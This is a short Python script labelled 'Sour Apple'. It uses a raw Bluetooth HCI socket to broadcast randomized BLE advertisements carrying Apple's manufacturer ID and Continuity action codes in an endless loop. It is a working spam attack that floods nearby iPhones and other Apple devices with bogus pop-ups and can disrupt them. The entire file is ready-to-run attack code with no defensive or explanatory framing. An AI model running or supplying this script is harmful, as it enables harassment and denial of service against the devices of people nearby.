#ESP32(Python) Sour Apple by @RapierXbox and @Amachik
import random
import bluetooth._bluetooth as bluez
from time import sleep
import struct
import socket
import array
import fcntl
from errno import EALREADY

def main():
    hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    req_str = struct.pack("H", 0)
    request = array.array("b", req_str)
    try:
        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
    except IOError as e:
        if e.errno == EALREADY:
            pass
        else:
            raise
    finally:
        hci_sock.close()

    try:
        sock = bluez.hci_open_dev(0)
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware 0: {e}")
        return
    try:
        while True:
            types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
            bt_packet = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
            cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
            bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)
            cmd_pkt = struct.pack("<B", 0x01)
            bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
            cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
            bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)

            sleep(0.02)
            cmd_pkt = struct.pack("<B", 0x00)
            bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    except KeyboardInterrupt:
        cmd_pkt = struct.pack("<B", 0x00)
        bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    except Exception as e:
        print(f"An error occurred: {e}")
        cmd_pkt = struct.pack("<B", 0x00)
        bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)


if __name__ == "__main__":
    main()
